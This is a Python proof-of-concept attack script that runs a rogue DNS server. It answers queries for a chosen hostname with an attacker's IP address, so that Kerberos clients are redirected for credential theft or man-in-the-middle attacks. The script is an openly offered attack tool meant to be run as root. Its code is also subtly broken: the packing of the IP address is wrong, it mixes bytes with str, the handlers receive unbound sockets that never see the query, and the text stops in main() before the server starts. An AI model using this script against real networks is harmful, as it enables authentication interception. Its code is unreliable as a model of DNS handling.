"""
Proof-of-Concept: DNS Spoofing for Principal Name Canonicalization

This script demonstrates the vulnerability described in RFC 4120, Section 1.3 and 10,
where Kerberos clients use insecure DNS to canonicalize hostnames for service principal names.
By spoofing DNS responses, an attacker can redirect a client's authentication request
to a malicious server, enabling credential theft or man-in-the-middle attacks.

Requirements:
- Python 3
- Root privileges (to bind to port 53 and send raw packets)
- A vulnerable Kerberos client configured to use this machine as its DNS resolver

Usage:
    sudo python3 poc_dns_spoofing_principal_canonicalization.py
"""

import socket
import struct
import sys
import threading
import time

# Configuration
ATTACKER_IP = "0.0.0.0"  # Listen on all interfaces
ATTACKER_PORT = 53       # Standard DNS port
TARGET_HOSTNAME = "legitimate-server.example.com"  # The hostname the client intends to contact
SPOOFED_IP = "192.168.1.100"  # The attacker's IP address

# DNS Packet Constants
DNS_HEADER_FORMAT = "!HHHHHH"
DNS_QUESTION_FORMAT = "!H H"
DNS_ANSWER_A_FORMAT = "!H H I"

# DNS Response Flags
DNS_FLAGS_RESPONSE = 0x8000
DNS_FLAGS_OPCODE_STANDARD = 0x0000
DNS_FLAGS_AUTHORITATIVE = 0x0400
DNS_FLAGS_RECURSION_DESIRED = 0x0100
DNS_FLAGS_RECURSION_AVAILABLE = 0x0080
DNS_FLAGS_NO_ERROR = 0x0000

# DNS Record Types
DNS_TYPE_A = 1
DNS_CLASS_IN = 1

def encode_dns_name(name):
    """
    Encode a DNS name into the format used in DNS packets.
    Each label is prefixed by its length.
    """
    encoded = b''
    for label in name.split('.'):
        encoded += struct.pack('B', len(label)) + label.encode('utf-8')
    encoded += b'\x00'  # Null terminator
    return encoded

def build_dns_response(query_id, question_name, answer_ip):
    """
    Construct a DNS response packet that maps the question_name to answer_ip.
    """
    # DNS Header
    flags = DNS_FLAGS_RESPONSE | DNS_FLAGS_OPCODE_STANDARD | DNS_FLAGS_AUTHORITATIVE | DNS_FLAGS_RECURSION_DESIRED | DNS_FLAGS_RECURSION_AVAILABLE | DNS_FLAGS_NO_ERROR
    header = struct.pack(DNS_HEADER_FORMAT, query_id, flags, 1, 1, 0, 0)  # 1 question, 1 answer
    
    # Question Section
    question_name_encoded = encode_dns_name(question_name)
    question = question_name_encoded + struct.pack(DNS_QUESTION_FORMAT, DNS_TYPE_A, DNS_CLASS_IN)
    
    # Answer Section
    # Pointer to the question name (offset 12 from the start of the question section)
    answer_name = struct.pack('!H', 0xC00C)  # Pointer to offset 12
    answer_data = struct.pack('!I', socket.inet_aton(answer_ip))
    answer = answer_name + struct.pack(DNS_ANSWER_A_FORMAT, DNS_TYPE_A, DNS_CLASS_IN, 300) + answer_data  # TTL = 300 seconds
    
    return header + question + answer

def handle_dns_request(conn, addr):
    """
    Handle an incoming DNS request and respond with a spoofed IP address.
    """
    try:
        data = conn.recv(1024)
        if not data:
            return
        
        # Extract query ID from the DNS header
        query_id = struct.unpack('!H', data[:2])[0]
        
        # Check if the request is for the target hostname
        # The question section starts at offset 12
        question_start = 12
        question_end = data.find(b'\x00', question_start)
        if question_end == -1:
            return
        
        # Decode the question name
        question_name = b''
        i = question_start
        while i < len(data) and data[i] != 0:
            length = data[i]
            i += 1
            question_name += data[i:i+length].decode('utf-8') + '.'
            i += length
        question_name = question_name.rstrip('.')
        
        if question_name.lower() == TARGET_HOSTNAME.lower():
            print(f"[+] Intercepted DNS request for {TARGET_HOSTNAME} from {addr[0]}")
            response = build_dns_response(query_id, TARGET_HOSTNAME, SPOOFED_IP)
            conn.send(response)
            print(f"[+] Sent spoofed DNS response mapping {TARGET_HOSTNAME} to {SPOOFED_IP}")
        else:
            # For other requests, we could forward them or drop them.
            # For this PoC, we'll drop them to focus on the target.
            print(f"[-] Ignored DNS request for {question_name} from {addr[0]}")
    except Exception as e:
        print(f"[!] Error handling request from {addr[0]}: {e}")
    finally:
        conn.close()

def start_dns_server():
    """
    Start a simple DNS server that listens for requests and responds with spoofed IPs.
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((ATTACKER_IP, ATTACKER_PORT))
    print(f"[*] DNS server listening on {ATTACKER_IP}:{ATTACKER_PORT}")
    print(f"[*] Waiting for DNS requests for {TARGET_HOSTNAME}...")
    
    while True:
        data, addr = server.recvfrom(1024)
        # Handle the request in a separate thread to avoid blocking
        thread = threading.Thread(target=handle_dns_request, args=(socket.socket(socket.AF_INET, socket.SOCK_DGRAM), addr))
        thread.start()
        # Note: The above threading approach is simplified. In a real scenario, you'd manage connections more carefully.
        # For this PoC, we'll use a simpler approach without threading for clarity.
        handle_dns_request(socket.socket(socket.AF_INET, socket.SOCK_DGRAM), addr)

def main():
    print("[*] Starting DNS Spoofing PoC for Principal Name Canonicalization")
    print(f"[*] Target Hostname: {TARGET_HOSTNAME}")
    print(f"[*] Spoofed IP: {SPOOFED_IP}")
    print("[*] This script demonstrates how an attacker can redirect Kerberos authentication")
